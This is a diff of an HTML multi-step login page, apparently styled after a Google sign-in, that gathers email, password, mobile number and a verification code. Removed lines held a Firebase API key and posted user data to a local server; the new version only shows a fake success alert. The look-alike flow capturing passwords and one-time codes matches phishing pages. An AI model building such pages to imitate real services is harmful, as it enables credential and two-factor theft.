@@ -9,11 +9,6 @@
     <!-- ✅ Load Firebase from CDN -->
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js"></script>
-    
-    <!-- Firebase SDK (CDN) -->
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js"></script>
-
     <style>
         * {
             margin: 0;
@@ -51,7 +46,7 @@
             color: #202124;
         }
 
-        .subtitle, .email-display {
+        .subtitle {
             font-size: 16px;
             margin-bottom: 32px;
             color: #202124;
@@ -66,11 +61,6 @@
             margin-bottom: 8px;
             font-size: 16px;
             color: #202124;
-        }
-
-        .input-field:focus {
-            border: 2px solid #1a73e8;
-            outline: none;
         }
 
         .button-container {
@@ -140,7 +130,6 @@
             </footer>
         </div>
     </div>
-
     <!-- Password Page -->
     <div class="page" id="passwordPage">
         <div class="container">
@@ -148,7 +137,20 @@
             <input type="password" class="input-field" placeholder="Password" id="passwordInput">
             <div class="button-container">
                 <button class="next-button" onclick="showPhonePage()">Next</button>
+                <button class="next-button" onclick="showForgotPasswordPage()">Forgot password?</button>
             </div>
+            <footer>
+                <div>
+                    <select class="footer-link" style="border: none;">
+                        <option>English (United States)</option>
+                    </select>
+                </div>
+                <div class="footer-links">
+                    <a href="#">Help</a>
+                    <a href="#">Privacy</a>
+                    <a href="#">Terms</a>
+                </div>
+            </footer>
         </div>
     </div>
 
@@ -158,91 +160,96 @@
             <h1>Verify your phone</h1>
             <input type="tel" class="input-field" placeholder="Mobile number" id="phoneInput">
             <div class="button-container">
-                <button class="next-button" onclick="submitLogin()">Submit</button>
+                <button class="next-button" onclick="showVerificationPage()">Next</button>
             </div>
+            <footer>
+                <div>
+                    <select class="footer-link" style="border: none;">
+                        <option>English (United States)</option>
+                    </select>
+                </div>
+                <div class="footer-links">
+                    <a href="#">Help</a>
+                    <a href="#">Privacy</a>
+                    <a href="#">Terms</a>
+                </div>
+            </footer>
         </div>
     </div>
 
-    <!-- Firebase Authentication and Login Handling -->
- <script>
-    // ✅ Initialize Firebase using a CDN
-    const firebaseConfig = {
-        apiKey: "AIzaSyDN92MjC4k2pzBD8wgc3ADy8qQvqKElUyM",
-        authDomain: "login-1b560.firebaseapp.com",
-        projectId: "login-1b560",
-        storageBucket: "login-1b560.firebasestorage.app",
-        messagingSenderId: "231863683041",
-        appId: "1:231863683041:web:aea7cf73438119acc0f4a0",
-        measurementId: "G-62ETK5W9R3"
-    };
+    <!-- Verification Code Page -->
+    <div class="page" id="verificationPage">
+        <div class="container">
+            <h1>Enter verification code</h1>
+            <input type="text" class="input-field" placeholder="Enter code" id="codeInput">
+            <div class="button-container">
+                <button class="next-button" onclick="submitLogin()">Submit</button>
+            </div>
+            <footer>
+                <div>
+                    <select class="footer-link" style="border: none;">
+                        <option>English (United States)</option>
+                    </select>
+                </div>
+                <div class="footer-links">
+                    <a href="#">Help</a>
+                    <a href="#">Privacy</a>
+                    <a href="#">Terms</a>
+                </div>
+            </footer>
+        </div>
+    </div>
+    <script>
+        let userData = {
+            email: '',
+            password: '',
+            phone: ''
+        };
 
-    firebase.initializeApp(firebaseConfig);
-    const auth = firebase.auth();
-
-    let userData = {
-        email: '',
-        password: '',
-        phone: ''
-    };
-
-    function showPage(pageId) {
-        document.querySelectorAll('.page').forEach(page => page.classList.remove('active-page'));
-        document.getElementById(pageId).classList.add('active-page');
-    }
-
-    function showPasswordPage() {
-        userData.email = document.getElementById('emailInput').value;
-        if (userData.email) {
-            showPage('passwordPage');
-        } else {
-            alert("Please enter your email.");
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(page => page.classList.remove('active-page'));
+            document.getElementById(pageId).classList.add('active-page');
         }
-    }
 
-    function showPhonePage() {
-        userData.password = document.getElementById('passwordInput').value;
-        if (userData.password) {
-            showPage('phonePage');
-        } else {
-            alert("Please enter your password.");
-        }
-    }
-
-    async function submitLogin() {
-        userData.phone = document.getElementById('phoneInput').value;
-        if (userData.phone) {
-            try {
-                const userCredential = await auth.signInWithEmailAndPassword(userData.email, userData.password);
-                const user = userCredential.user;
-
-                const userDataToSend = {
-                    email: userData.email,
-                    phone: userData.phone,
-                    loginTime: new Date().toISOString()
-                };
-
-                console.log("📤 Sending data to server:", userDataToSend);
-
-                const response = await fetch("http://localhost:3000/saveUser", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(userDataToSend)
-                });
-
-                const result = await response.json();
-                console.log("✅ Server Response:", result);
-
-                alert("Login successful! Data saved locally and in Firestore.");
-            } catch (error) {
-                console.error("❌ Login Error:", error.message);
-                alert(error.message);
+        function showPasswordPage() {
+            userData.email = document.getElementById('emailInput').value;
+            if (userData.email) {
+                showPage('passwordPage');
+            } else {
+                alert("Please enter your email.");
             }
-        } else {
-            alert("Please enter your mobile number.");
         }
-    }
-</script>
 
+        function showPhonePage() {
+            userData.password = document.getElementById('passwordInput').value;
+            if (userData.password) {
+                showPage('phonePage');
+            } else {
+                alert("Please enter your password.");
+            }
+        }
 
+        function showForgotPasswordPage() {
+            showPage('phonePage');
+        }
+
+        function showVerificationPage() {
+            userData.phone = document.getElementById('phoneInput').value;
+            if (userData.phone) {
+                showPage('verificationPage');
+            } else {
+                alert("Please enter your mobile number.");
+            }
+        }
+
+        async function submitLogin() {
+            let code = document.getElementById('codeInput').value;
+            if (code) {
+                alert("Verification successful! Logging in...");
+            } else {
+                alert("Please enter verification code.");
+            }
+        }
+    </script>
 </body>
 </html>
